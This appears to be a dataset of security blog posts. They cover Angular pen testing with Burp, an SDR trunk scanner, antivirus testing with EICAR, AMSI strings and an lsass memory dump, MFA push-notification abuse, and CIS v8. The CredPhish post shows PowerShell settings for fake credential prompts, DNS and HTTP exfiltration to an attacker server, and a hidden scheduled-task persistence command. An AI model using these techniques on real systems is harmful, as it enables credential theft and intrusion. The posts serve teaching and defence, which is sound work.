\n\nhttps://developers.google.com/web/updates/2019/02/rendering-on-the-web  \n\nWhen pen testing an Angular app, one of the results of the technology shift is that you will likely spend more time in the browser developer console as well as your interception proxy. Angular 2+ has a feature in the form of a special function called \u201cenableProdMode()\u201d which is called right after the framework is bootstrapped in the DOM. This assumes that the developers have indeed deployed the application in \u201cproduction mode\u201d.  \n\nThe \u201cenableProdMode()\u201d function makes Angular skip building the debugging elements tree in the browser. This debugging elements tree is useful to you as a penetration tester as you can use the Angular \u201cng.probe()\u201d function to examine page elements after selecting that element on a page. In production mode, \u201cng.probe()\u201d for a page component will return a null value which is not useful. \n\nOne of the early things you want to do is modify this function \u201cin flight\u201d in your interception proxy so it \u201cfails\u201d to enable production mode. \n\nThere is one slight twist on this. If the application is also deployed with https://webpack.js.org, then it is possible that the function name is obfuscated. Fortunately, there is a string within the function that reads \u201cCannot enable prod mode after platform setup\u201d which you can use to find the obfuscated function name. \n\nIf you are using Burp Suite, here is a way you can configure the proxy to rewrite the function in flight. This example assumes that webpack has not been used to obfuscate function names. The steps are as follows: \n\nSelect the Proxy tab in Burp Suite \n\nSelect the Proxy -> Options sub-tab \n\nScroll down to the \u201cMatch/Replace\u201d section and remove any existing rules \n\nClick \u201cAdd\u201d to add a new rule \n\nSelect \u201cResponse Body\u201d as the type \n\nMatch the string \u201cfunction enableProdMode(){\u201c \n\nAdd in a replacement string that adds\u201c_devMode=1;\u201d and returns from the function. When this is done, it is important to be careful to preserve script syntax integrity so that you don\u2019t completely break functionality. \n\nBurp Suite Match/Replace Rules \n\nRule to Rewrite the \u201cenableProdMode()\u201d Function \n\nDebugger Console Output After Reloading the Page \n\nThere is another snag you might run into which will force you into adding another match/replace rule. I learned this one the hard way of course (like so many things). \n\nSince 2016, some HTML included source tags have an \u201cintegrity\u201d option which is actually a pretty nice feature. In short, the integrity tag allows the developer to specify a hash algorithm and a base64 encoded hash. The browser will attempt to validate the hash and will not execute the JavaScript if the hash does not match.  \n\nA related defense in-depth technique is to leverage Content Security Policy (CSP). CSP is a whitelisting technique that allows web server administrators to specify the domains that browsers should be considered as valid sources of executable scripts. For browsers that support CSP, this technique further helps mitigate Cross-Site Scripting and data injection attacks. CSP is implemented with an HTTP header added to server responses. Browsers that don\u2019t support CSP will fall back to the normal same-origin policy model. For more information, please refer to https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP.  \n\nAs you might imagine, rewriting a JavaScript function in flight will certainly violate the integrity tag check if it is present. A second match/replace rule similar to the below screenshot will remediate this roadblock for you to continue testing. \n\nExample Response Body Rule to Remove the \u201cintegrity\u201d Tag \n\nAfter putting this into place, and reloading your Angular app contents, you can select any page element and probe its state using \u201cng.probe()\u201d in the developer tools console, and then even create an instance of the JavaScript object to begin your exploration. From here you can manipulate attributes of that object to see what impact it has. What you try to do is only limited by your creativity and time constraints. An example of using this probe technique is shown below. \n\nSample Debugger Console Output \n\nThat\u2019s about all I have for you now. Happy web app testing trails and keep right on hacking. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using SDR to Build a Trunk Tracker - Police, Fire, and EMS Scanner\"\nTaxonomies: \"Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch\"\nCreation Date: \"Mon, 17 May 2021 17:46:47 +0000\"\nRay Felch //\n\nIntroduction \n\nRecently, I came across an interesting article on using software-defined radio (SDR) to create a Police, Fire, EMS, and Public Safety systems scanner. Viewing a few of these Trunk tracking scanners on Amazon, I quickly discovered that they are not cheap at all. You can spend several hundred dollars on a Trunked Radio tracking scanner; however, we can build one with just two $25 SDR USB dongles. \n\nHow Trunking systems work \n\nTrunking systems carry an exceptionally large volume of analog and digital radio traffic and are a frequency hopping system. Trunk systems are controlled by computers and broadcast information to all the radios on the network by way of a control channel. In the following diagram, notice that the control channels appear in red.  \n\nThe channels that are displayed in green are the allotted frequencies for a given Talkgroup (an assigned group on a trunked radio system). \n\nWikipedia defines a talkgroup as follows: \n\nA talkgroup is an assigned group on a trunked radio system. Unlike a conventional radio which assigns users a certain frequency, a trunk system takes several frequencies allocated to the system. Then the control channel coordinates the system so talkgroups can share these frequencies seamlessly. \n\nIf we were to tune to the control channel frequency using SDR# (software-defined radio software), we would discover the following waterfall. Not only is it visually recognizable, but it also has an incredibly unique (raspy/metallic) digital sound. \n\nAll radios in the talkgroup monitor the control channel to know which frequency to listen to. Virtual channels are created by an admin and assigned talkgroup numbers (listed in the Target column of UniTrunker). \n\nWhen the user pushes the PTT (push-to-talk) key, a request is sent to the control computer. The control computer then assigns a frequency, and all radios logged into that talkgroup, switch to that assigned frequency, so they can hear the transmission. \n\nWhen the transmission is responded to, this process is repeated and typically a different frequency is assigned for the reply. It becomes apparent that if we were to monitor a single frequency, we would miss most of the radio traffic for a given talkgroup's system. \n\nWhy the trunking system was created \n\nTrunking systems provide very efficient use of the radio spectrum. Prior to its implementation, radio frequencies that were assigned were static. An example could be made that a police agency needing a dozen conventional channels, would waste that portion of the spectrum if the channel were idle for any significant amount of time. In the 'trunked' system, the officers would be assigned to a talkgroup and not a dedicated channel and share a smaller pool of channels. It is common for greater than 350 talkgroups to share as few as 20 channels. \n\nAnother benefit of a trunking system is multiple sites at separate locations can be linked together. School campuses consisting of multiple buildings in various parts of the city can all be linked. Even cities, states, and provinces can be linked together. My location here in Iowa borders Illinois, so talkgroups for law enforcement, fire, and safety share a common control channel. \n\nUniTrunker: Trunk Radio decoding software \n\nUniTrunker is a Trunk Radio decoder that supports Motorola Type II, EDACS, MPT1327, P25 systems and works well with RTL-based SDRs.\n\nTo build our SDR-based Trunked Radio scanner, we will need to install UniTrunker, as well as a few other required dependencies.  \n\nNote: When I first attempted to install these programs, I ran into a few problems, mostly due to the order that I installed things. That being the case, I will attempt to present this information in a structured, step-by-step manner and hopefully prevent you from making the same mistakes. \n\nNote: We will be using an extremely popular online site (RadioReference.com) to find the control channels for our location. \n\nWe need to download the following software: \n\nI will walk you through it. It is not that bad, really! \n\nSDR Sharp \n\nUniTrunker \n\nVirtual Cable \n\nDSDPlus \n\nSDR Sharp (SDR#): Install procedure \n\nNote: You will not need SDR Sharp to build our UniTrunker tracking radio scanner, however, it will come in handy to ensure the required RTL-SDR drivers and WinUSB drivers have been installed properly. Also, we will be using SDR Sharp to verify that the listed control channel frequency specified is accurate. The Radio Reference group attempts to keep their databases up to date, however sometimes the listed control channels may be outdated or recently changed (slightly shifted).  \n\nSDR Sharp is also a \"fun to play with\" piece of software. You can tune to frequencies in the FM radio band 88MHZ to 108MHz and find your favorite radio stations for your area! \n\nI typically will use SDR Sharp to tune into the listed control channel frequency, to be sure the frequency is accurately listed. I.e. For my location in southeast Iowa, the RACOM Network control channel frequency for my neighboring city of Rock Island, Illinois is displayed as 857.2375MHz. (Control channels are always displayed in red) \n\nHowever, checking this with SDR Sharp shows the frequency needs to be 857.1375MHz (shifted down by 100KHz). We will need to remember this frequency when we configure the UniTrunker software later. \n\nNote: I chose the 'unskinned' version of SDR Sharp version for this demo. \n\nVisit: http://airspy.com/ and click Download \n\nScroll down a few lines and find the link for 'unskinned SDR#', click where it says \"here.\" \n\nInsert the rtl-sdr USB dongle(s) \n\nDownload the SDR Sharp zip file \n\nDouble-click the zip file and extract the files to a folder of your choice \n\nNavigate to the extracted folder \n\nExecute \"install-rtlsdr.bat\" (This installs RTL-SDR drivers and writes the file \"zadig.exe\" to the folder) \n\nWinUSB driver (using zadig,exe): Install procedure \n\nRight mouse-click on \"zadig.exe\" and Run as Administrator \n\nAnswer \"Yes\" to \"Allow this app to make changes to this device\" \n\nSelect \"Options - List Devices\" \n\nSelect \"Bulk-In, Interface (Interface 0)\" \n\nClick \"Install Driver\" \n\nVerify a successful SDR Sharp install by executing \"SDRSharp.exe\" \n\n(Don't forget to select the RTL-SDR under \"Devices\" after SDR Sharp loads) \n\nDSDPlus (Digital decoder software): Install procedure \n\nVisit: https://www.dsdplus.com/download-2/ \n\nClick on DSDPlus v1.101 link \n\nClick on DSDPlus v1.101_DLL_Files \n\nNavigate to /Downloads folder \n\nRight mouse-click on the DSDPlus v1 101 zip file and \"extract all\" \n\nRight mouse-click on the DSDPlus v1 101 DLL zip file and \"extract-all\" \n\nNavigate to the DSDPlus DLL extracted folder \n\nPress CTL-A (select all) and move them to the DSDPlus extracted folder \n\nClick on DSDPlus.exe  (to run DSDPlus) \n\nWe will see a few windows pop open, and we now know DSDPlus is up and running. \n\nVirtual Cable: Install procedure \n\nVisit: https://vb-audio.com/Cable/index.htm \n\nClick the orange Download for Windows \n\nNavigate to the /Downloads folder \n\nRight mouse-click on the zip file and \"extract-all\" \n\nNavigate to the VBCABLE_Driver_Pack43 extracted folder \n\nRight mouse-click and Run as Administrator \"VBCABLE_Setup_x64.exe\" \n\nClick \"Install Driver\" \n\nWhen completed, reboot Windows \n\nAfter Reboot \n\nWe can quickly verify that VB-Cable is installed properly by clicking \"VBCABLE_ControlPanel.exe\".  \n\nWe should see the following window open. This indicates a successful install, and we can now close this window. \n\nConfiguring VB Cable \n\nHover over the speaker icon (bottom right on the task bar) Select Sounds - Playback \n\nEnsure that the speakers are the default for Playback \n\nClick the Recording tab \n\nLeft mouse-click (one time) on the VB Cable (to highlight it) \n\nRight mouse-click and select \"Set as default\" \n\nClick \"OK\" \n\nConfigure UniTrunker \n\nWith all the required dependencies now installed, we are ready to install, configure, and run UniTrunker. \n\nUniTrunker software: Install procedure \n\nVisit: http://www.unitrunker.com/download/ \n\nSelect the latest released version (UniTrunker version 1.0.33.6 in my case) \n\nNavigate to the /Downloads folder \n\nDouble-click on \"UniTrunker-1.0.33.6.msi\" (to install) \n\nInfo: UniTrunker will be installed to C:/Program Files(x86) \n\nNote: Do not create a shortcut for \"uniform.exe\" (UniTrunker), instead click the Windows logo, type \"unitrunker\", right mouse-click on the app, and select \"Pin to taskbar\" or optionally \"Pin to Start\". \n\nClick the UniTrunker icon on the taskbar \n\nClick \"First time installation\" \n\nClick the \"plus\" button to add a receiver (we'll need to do this twice, once for SDR-1 and then again later for SDR-2 (for now, let us configure SDR-1) \n\nClick the RTL2832 button \n\nThe following is my configuration for both receivers (SDR-1 and SDR-2) \n\nAfter completing the configuration for receiver #1 (SDR-1), repeat the process by clicking the \"plus\" button again and selecting RTL2832 for receiver #2 (SDR-2). \n\nImportant: The settings highlighted in yellow are the only differences between the two receivers and it is especially important to enumerate these settings exactly as shown above (The only exception is the name you give the receiver in the Model field. I chose to name the first receiver \"SDR-1 Control channel\" and the second receiver \"SDR-2 Scanner\". You are free to call them anything you like.)  \n\nAlso, the \"Park\" value (frequency) underlined in red (SDR-1 receiver) is set according to my location here in Iowa and it will need to be changed to one of your control channel frequencies (as per the Radio Reference database for your area). \n\nThat is it!  Everything is installed and we are ready to operate our Trunked scanner! \n\nEnsure that DSDPlus is running and click the Play arrow (Start) on both receivers. You should now see the following in the UniTrunker window, and the scanner should open and be operational. \n\nConclusion \n\nThis was a fun project that opened some new avenues for me in the realm of software-defined radio. There are a ton of interesting features to explore, as this is a very robust application! Interestingly, DSDPlus is also an amazing tool that takes care of decoding the digital trunk traffic into something we can hear. \n\nWhile researching this project, I discovered that there is quite a bit of information out there regarding UniTrunker, as well as the implementation of other SDR based projects. I even ran across another SDR Trunk tracking scanner application known as \u201cSDR Trunker\u201d, although I have not reviewed it... yet.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Is This Thing On?\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, How-To, Informational, InfoSec 101, Michael Allen, Michael Allen\"\nCreation Date: \"Wed, 26 May 2021 19:09:09 +0000\"\nHow to make sure your antivirus is working without any malware \n\nMichael Allen //\n\nRecently, a customer asked me if there was a way they could generate alerts from the new antivirus product they deployed without executing any actual malware on the system they were testing it on. The computer they wanted to test was an especially sensitive and business-critical system, so it was important that they perform the test without executing any third-party code. Additionally, I wouldn't have direct access to the system they were testing (this question came up after their pentest was already complete), so the methods I shared with them needed to be easily communicated to a system administrator and not rely on any specialized \"hacking tools\" like Metasploit that might not be available inside the environment. \n\nI thought this was an interesting scenario that other defenders might also face, so I decided to share some of my suggestions here on the BHIS blog. Keep in mind, this is by no means an exhaustive list of all the different tests that can be done of an antivirus product nor all the different ways that any given feature of an antivirus product can be tested. This is just a starting point for some relatively easy tests that can be performed without any third-party tools. \n\n1. Testing malware file detection with the EICAR test file \n\nThe EICAR test file was designed by the European Institute for Computer Antivirus Research (EICAR) and Computer Antivirus Research Organization (CARO) specifically for testing antivirus programs. It contains only the following ASCII text (along with some optional trailing whitespace), and can easily be created by pasting the text into a text editor and then saving the file to disk: \n\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* \n\nEICAR Test File Contents \n\nThe two screenshots below show a simple example of pasting the EICAR string into Windows Notepad and then saving it as a file with the \".EXE\" extension. \n\nEICAR Data Pasted into Notepad \n\nSaving the EICAR File to Disk \n\nThe file can also be downloaded directly from the EICAR website here: https://secure.eicar.org/eicar.com.txt \n\nOnce the EICAR file is saved to disk, it should generate an alert from any antivirus products installed on the computer. Some antivirus products limit automatic file scanning to only those files that have certain file name extensions (e.g., \".EXE\"), so I recommend saving several copies of the file with different extensions that you want to test. If some of the files get detected and others don't, you'll know that your antivirus product doesn't automatically scan certain file extensions. For example, you might notice that saving the file with a .TXT or .JPG extension doesn't cause it to get detected while saving it as a .COM, .EXE, or .DOCM does. \n\nHere's an example that shows a folder where I saved multiple copies of the file under names with various file extensions: \n\nEICAR File Saved as Files with Various Extensions \n\nAnd here's part of the alert that was shown when Windows Defender detected those files: \n\nAlert from Detection of Test Files (Partial) \n\n2. Testing malware detection in Alternate Data Streams \n\nOn computers that use the NTFS filesystem, malware can also be stored in a file's Alternate Data Stream (ADS) rather than inside the file itself. This technique has been used by malware authors for years in attempts to hide malware on disk since some antivirus products may not check for malicious data stored inside Alternate Data Streams. \n\nUsing PowerShell, you can easily create an Alternate Data Stream that contains the EICAR test file and confirm whether your antivirus software scans for malware inside an ADS. The first PowerShell command below creates the file, \"ADS_Test.txt\", which just contains the text string, \"Nothing to see here.\" This file doesn't actually contain any malicious code, but the second command adds an Alternate Data Stream named \"EICAR\" to the file and stores the EICAR string inside the ADS. \n\nset-content .\\ADS_Test.txt \"Nothing to see here.\" \n\nset-content .\\ADS_Test.txt:EICAR 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \n\nPowerShell Commands for Creating an ADS Containing the EICAR String \n\nThe screenshot below shows execution of these two commands, along with a \"Get-Content\" command in between that just confirms the presence of the \"ADS_Test.txt\" file by displaying its contents. \n\nExecution of the PowerShell Commands Above \n\nLike the test files that were created in the last section, the \"malicious\" Alternate Data Stream was also detected by Windows Defender. \n\nDetection of EICAR Data in the ADS \n\n3. Testing in-memory detection of malicious scripts with AMSI \n\nSimilar to the EICAR string, Microsoft's Antimalware Scan Interface (AMSI) has its own test string, shown below. \n\n'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386' \n\nAMSI Test String \n\nAMSI allows antivirus products to scan for malicious code inside of commands and scripts that are executed inside of PowerShell processes, Microsoft Office Macros, and Windows-supported scripting languages like VBScript and JavaScript. This functionality is critical in a defensive product since many payloads can be downloaded into memory and executed without ever being written to disk - thus preventing them from being detected by the traditional, file-scanning antivirus functions tested in the previous sections. \n\nTo test whether AMSI is enabled and detecting malware on your system, open a PowerShell or PowerShell ISE window, and paste in the test sample text, shown above. If AMSI is enabled and working on your system, you should see a message like the one shown below. \n\nDetection of AMSI Test String \n\nIf, for some reason, the test string isn't recognized as malicious, you can also try strings like the ones below that are present in well-known hacking tools. \n\n'amsicontext' \n\n'Invoke-Mimikatz' \n\nDetection of Hacking Tool Strings \n\nIf you don't have a solid understanding of PowerShell error messages, be sure you include the single-quote characters at the beginning and end of each string when performing these tests. The test strings aren't valid PowerShell syntax by default, so if you run them without the quotes, other error messages will be displayed that could cause some confusion. \n\nSuccessful detection of the malicious strings will generate an error that specifically states, \"This script contains malicious content,\" as opposed to more generic error text like \"The term '\u2026' is not recognized\u2026\" or \"ObjectNotFound\". \n\n4. Testing behavior-based detection with Windows Task Manager \n\nThe last example I'll demonstrate here simulates behavior that might occur after successful malware execution, rather than simulating the malware's presence on disk or in memory. Behavior is less frequently detected by antivirus products than the presence of known malware data on disk or in memory, so depending on the product you're using, you may need to supplement your antivirus with other endpoint detection and response (EDR) options to see a detection. \n\nTo perform this test, first execute Windows Task Manager with elevated, Administrator privileges. \n\nAdministrative Execution of Task Manager from the Windows Start Menu \n\nAfter you start Task Manager, click the \"More details\" button near the bottom of the window. \n\n\"More details\" Button \n\nThen click the \"Details\" tab and scroll down in the list until you find the \"lsass.exe\" process. \n\n\"lsass.exe\" Shown Under Details \n\nRight-click on \"lsass.exe\", and then click on \"Create dump file\" in the menu that appears. \n\n\"Create dump file\" \n\nAt this point, Task Manager will attempt to read the memory contents of the LSASS process and save the data to a file. The LSASS process memory is commonly targeted by attackers since it may contain login credentials or password hashes for users that have logged into the system. When this process begins, you'll see a window appear like the one below. \n\nMemory Dump in Progress \n\nIf your antivirus or other endpoint defense product detects the malicious behavior, the Task Manager window may close abruptly, or you may see a notification from the defensive software. If the behavior is not detected, on the other hand, the dump file will be created in the current user's \"Temp\" directory, and you'll see the following window appear: \n\nMemory Dump Complete \n\nDouble check the Temp directory to be sure that the file was created successfully - this will also confirm that the malicious behavior was not blocked. If the file exists, be sure to delete it when you're done, since it's likely to contain credentials or other information that would be useful to an attacker, should your system get breached.  \n\nConclusion \n\nLike I mentioned at the start of this article, this isn't meant to be a perfect or complete test, but hopefully it will give you a starting point from which to tell if your antivirus software is working the way you expect it to - especially in environments where your ability to upload externally generated test files to systems may be limited. \n\nKeep in mind that detection of the EICAR and AMSI test data doesn't necessarily indicate that an antivirus product parses files of a given type successfully. After all, the test files created in this article only contain a single, well-known ASCII string - so they're extremely easy to detect through basic means and may not necessarily represent properly formatted program executables or document files that might have malicious code stored in a macro, or at the very least, some place other than line one. ? \n\nDetection of the EICAR test file does at least confirm that your antivirus product is scanning files though. The same is true if the AMSI test string is detected - at least you know that your antivirus product is hooking into AMSI, scanning code, and generating alerts. \n\nLast, if you're interested in a more thorough assessment of the endpoint security controls in use in your environment than just those I've described here, check out our Services page or Contact us for information about our Command & Control and Data Exfiltration Assessment service, and let us show you the blind spots your antivirus, EDR, and network security controls may miss. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Backdoors & Breaches LIVE - 5/19/2021\"\nTaxonomies: \"Backdoors & Breaches, Blue Team, Blue Team Tools, Fun & Games, Informational\"\nCreation Date: \"Fri, 28 May 2021 12:54:18 +0000\"\n\nhttps://youtu.be/vZLNdZLHKz4\n\nJoin our Incident Master Ean Meyer as we play another round of Backdoors & Breaches (B&B) session using our new Tabletop Simulator (TTS) version! If you have STEAM / TABLETOP SIMULATOR / BACKDOORS & BREACHES WORKSHOP, you can play using the same version of the game. https:/steamcommunity.com/sharedfiles/filedetails/?id=2401033477\n\nIncident Master: \n\nEan | EanMeyer\n\nDefenders: \n\nQasim | hashtaginfosec\n\nKaitlyn | Kadawi\n\nBlake | zer0cool\n\nVee | Po1Zon_P1x13\n\nRalph | ralphte1\n\nGame Play Master:\n\nJason | BanjoCrashland\n\nOur good friend Edward Miro wrote an extensive guide on how to install and use B&B on TTS. Check it out below!\n\nhttps://www.blackhillsinfosec.com/backdoors-breaches-tabletop-simulator-guide/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Pushing Your Way In\"\nTaxonomies: \"Author, David Fletcher, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Red Team, Red Team Tools\"\nCreation Date: \"Fri, 09 Jul 2021 15:28:16 +0000\"\nDavid Fletcher //\n\nOver the past several years, attackers have gained significant traction in targeted environments by using various forms of password guessing. This situation was reflected in the 2020 Verizon DBIR under top threat action varieties. \n\nUse of stolen credentials sits right behind phishing as the second most utilized threat action in disclosed breaches. Malware variants don\u2019t appear until number seven item in that list. \n\nAs a result of the above, organizations rapidly adopted Multi-Factor authentication on their critical internet-facing services like Virtual Private Networks (VPNs), Virtual Desktop Infrastructure (VDI), web-based email portals, and many others. The COVID 19 crisis served to exacerbate this situation as entire organizations transitioned to remote work. \n\nLike other forms of security, two-factor authentication is not a silver bullet. Attackers have come up with ingenious ways to bypass two-factor authentication using reverse proxy software like CredSniper, Modlishka, and Evilginx2. \n\nOn some services, even when two-factor authentication is enforced, the order of operations that the service uses to perform the secondary factor may allow an attacker to validate user credentials. When this happens, the attacker can still perform attacks like password spraying to identify weak passwords. Then the attacker can use the validated credentials to attempt to authenticate to other services exposed by the organization and verify that two-factor implementation is uniform across the organization.  Services that serially check credentials can also be used to identify accounts where two-factor is not enabled. \n\nOver time, we have observed one technique that seems to be highly effective when we can find services with two-factor enabled that allow us to validate credentials before checking that secondary authentication factor. First, we typically perform password spraying as described above. If you are not familiar with password spraying, here are some good references that describe the technique: \n\nhttps://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/ \n\nhttps://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/ \n\nNext, with valid credentials at hand, we send push notifications to users whose accounts are configured to support them and see who blindly accepts. Often, we will perform this activity at specific times of the day, like 8-9 am, 12-1 pm, or 6-7 pm in the target user\u2019s time zone. These times are chosen because they are likely to be around the same time that the user authenticates for the first time in the morning, returns from lunch, or authenticates after leaving the office. Even with a small number of valid credentials, this technique appears to be very effective. \n\nBecause of the above, it is critical that users are properly trained to spot anomalous behavior associated with two-factor authentication. All of the following are indicators of compromise that users should be educated on and reporting to the information security department. \n\nUnsolicited phone call verifications \n\nUnsolicited push notifications \n\nSign-in notifications from new locations/devices \n\nOn many of our engagements, the activities listed above never get reported. When these activities occur, it means that in no uncertain terms, the user\u2019s password has been compromised. If users do not understand that correlation, they will never report the activity. \n\nWith so many organizations moving significant portions of their IT infrastructure into the cloud, a compromise like this can have devastating consequences. One such scenario was just discussed in our Attack Tactics 8 webcast. \n\nhttps://youtu.be/zdviQia1XD8\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Phish for User Passwords with PowerShell\"\nTaxonomies: \"How-To, Informational, InfoSec 101, Phishing, Red Team\"\nCreation Date: \"Tue, 27 Jul 2021 14:22:09 +0000\"\ntokyoneon //\n\nSpoofing credential prompts is an effective privilege escalation and lateral movement technique. It's not uncommon to experience seemingly random password prompts for Outlook, VPNs, and various other authentication protocols in Windows environments. Adversaries will abuse functionalities built into Windows and PowerShell to invoke credential popups to acquire user passwords. \n\nAs defined by the MITRE ATT&CK Framework: \n\n\"When programs are executed that need additional privileges ... it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries may mimic common operating system components to prompt users for credentials with a seemingly legitimate prompt ... via languages such as PowerShell.\" \n\nWhat is CredPhish? \n\nCredPhish is a PowerShell script designed to invoke credential prompts and exfiltrate passwords. It relies on the CredentialPicker API to collect user passwords, PowerShell's Resolve-DnsName for DNS exfiltration, and Windows Defender's ConfigSecurityPolicy.exe to perform arbitrary GET requests. \n\nBelow is an example of CredPhish in action. Notice the credentials delivered to the attacker's DNS server immediately after they're submitted in the Windows Security prompt. \n\nBy default, CredPhish will use Resolve-DnsName, a DNS resolver built into PowerShell, to exfiltrate credentials. It will convert each character in the credentials to its respective hexadecimal value, break the converted values into predefined chunks, and place the chunks into subdomains of popular websites. The below screenshot is an example of exfiltrated credentials in hexadecimal form. Notice the hexadecimal values for \"tokyoneon\" (746f6b796f6e656f6e) in the google.com and office.com subdomains. \n\nBefore resolving a DNS query, the DNS server will strip the hexadecimal subdomain to avoid creating dozens of error responses. In the below Wireshark screenshot, notice the \"Answers\" field no longer includes the subdomain and successfully resolves to one of Google's IP addresses. \n\nCredPhish.ps1 Configuration \n\nI designed credphish.ps1 to be an isolated script that doesn't require Import-Module, a common indicator of compromise. The configurable options are instead at the top of the PS1 script in the form of variables to avoid lengthy command-line arguments. \n\nThe first line is most important as it defines where the exfiltrated data is delivered (i.e., the attacker's Kali server). \n\n# exfil address  \n$exfilServer = \"192.168.56.112\" \n\nNext, several variables define how the prompt will appear to the unsuspecting target user. The $promptCaption defines the \"application\" requesting user credentials (e.g., \"Microsoft Office\"). And the $promptMessage usually specifies the account associated with the request. \n\n# prompt\n$targetUser = $env:username\n$companyEmail = \"blackhillsinfosec.com\"\n$promptCaption = \"Microsoft Office\"\n$promptMessage = \"Connecting to: $targetUser@$companyEmail\"\n$maxTries = 1 # maximum number of times to invoke prompt\n$delayPrompts = 2 # seconds between prompts\n$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid\n\nThe $maxTries variable defines how many times the prompt will appear before the target submits credentials. To avoid suspicion, 1 is the default value. The $delayPrompts variable defines how many seconds between each prompt (if $maxTries is greater than 1). And $validateCredentials, disabled by default, will attempt to locally validate the submitted credentials by using Start-Process in an elevated context. If enabled and the credentials are validated, $maxTries is ignored, and the data is sent to the attacker's server -- immediately. \n\nExfiltration Methods \n\nAs mentioned, DNS exfiltration is the default method used to deliver passwords to the attacker's server. The $exfilDomains list includes various domains used in DNS queries and chosen at random. The $subdomainLength variable determines the desired length of each subdomain. \n\n# dns\n# start dns server in kali: python3 /path/to/credphish/dns_server.py\n$enableDnsExfil = $true\n$exfilDomains = @('.microsoft.com', '.google.com', '.office.com', '.live.com') # domains for dns exfil\n$randomDelay = get-random -minimum 5 -maximum 20 # delay between dns queries\n$subdomainLength = 6 # maximum chars in subdomain. must be an even number between 2-60 or queries will break\n\nTo intercept credentials sent with the DNS exfiltration function, execute the dns_server.py script in Kali. Press Ctrl + c to terminate the DNS server, and it will reconstruct the intercepted credentials in plaintext. \n\nAnother method of exfiltration built into CredPhish is the HTTP request method. It leverages \"ConfigSecurityPolicy.exe,\" a binary included in Windows Defender, to deliver credentials to the attacker's server. Set the $enableHttpExfil variable to $true to enable it. \n\n# http\n# start http server in kali: python3 -m http.server 80\n$enableHttpExfil = $false\n$ConfigSecurityPolicy = \"C:\\Prog*Files\\Win*Defender\\ConfigSecurityPolicy.exe\"\n\nTo intercept credentials sent with ConfigSecurityPolicy.exe, start a simple HTTP server in Kali to capture them in the logs. \n\nOn the network, the exfiltrated credentials will appear as shown below. \n\nGET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1 Accept: */* UA-CPU: AMD64 Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E) Host: 192.168.56.104 Connection: Keep-Alive  \n\nAs the credentials are URL encoded before transmission, use Burp's Decoder module to observe the data or Python's urllib library to URL decode via command-line. \n\n>>> from urllib.parse import unquote >>> unquote(\"/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D\")  '/DESKTOP-S4DAAF0[tokyoneon:#!Extr3m3Ly_&ecuRe-P@ssw%rD#]' \n\nCredPhish.ps1 Execution \n\nTo quickly test CredPhish, move the credphish.ps1 to the target Windows 10 machine and execute it with PowerShell. \n\nA persistent method of execution might involve Task Scheduler, a component of Windows that provides the ability to schedule script executions at predefined intervals. The below schtasks example will execute credphish.ps1 every 2 minutes. \n\nschtasks /create /sc minute /mo 2 /tn \"credphish\" /tr \"powershell -ep bypass -WindowStyle Hidden C:\\path\\to\\credPhish\\credphish.ps1\" \n\nMitigations & Detection \n\nCredPhish, derived from projects like Invoke-LoginPrompt, CredsLeaker, and Stitch, isn't a silver bullet for password phishing. There's always room for improvement as this kind of attack is typically very targeted and user-specific. A more aggressive approach might involve spoofing the entire Windows 10 lock screen with Cobalt Strike and capturing credentials that way. \n\nThese types of attack techniques are not easily mitigated with preventive controls as they abuse system features. The MITRE ATT&CK Framework recommends: \n\nExercise user training as a way to bring awareness and raise suspicion for potentially malicious events and dialog boxes (e.g., Office documents prompting for credentials). \n\nMonitor process execution for unusual programs and malicious instances of Command and Scripting Interpreter's which prompt users for credentials. \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Center for Internet Security (CIS) v8  Why You Should Care\"\nTaxonomies: \"Author, Dale Hobbs, General InfoSec Tips & Tricks, Informational, InfoSec 101\"\nCreation Date: \"Thu, 12 Aug 2021 15:05:11 +0000\"\nDale Hobbs //\n\nThe Center for Internet Security (CIS) Controls are a recommended set of highly effective defensive actions for cyber defense that provide specific and actionable methods to prevent the most dangerous and pervasive cyber-attacks. They were initially developed by the SANS Institute and were originally known as the SANS Critical Security Controls. They are the combined knowledge of a variety of industry experts from every market into what is effectively a \u201cmust-do\u201d starting point for any organization, large or small.  \n\nThe CIS Controls provides a prioritized path to help organizations improve their cybersecurity program. In May 2021, the Center for Internet Security released the latest iteration of the CIS Controls Version 8 (v8).  \n\nAfter re-assessing the Controls and how they matched up against the modern threat landscape, they are now task-focused and grouped by activity as opposed to which group(s) in an organization manage the devices relevant to each control. As a result, the CIS Controls have been reduced from 20 down to 18. These 18 Controls contain 153 safeguards (formerly known as sub-controls), as opposed to 171 in v7.1, and they have done a much better job at incorporating both Cloud and Mobile technologies. This was an area that was lacking in v7.1, so this is a big step in the right direction. \n\nV8 still makes use of the three Implementation Groups (IGs) that were introduced in v7.1. In case you are not familiar with these groups, let's recap.   \n\nIG1 is aimed at small to medium-sized organizations with limited in-house IT and security staff whose 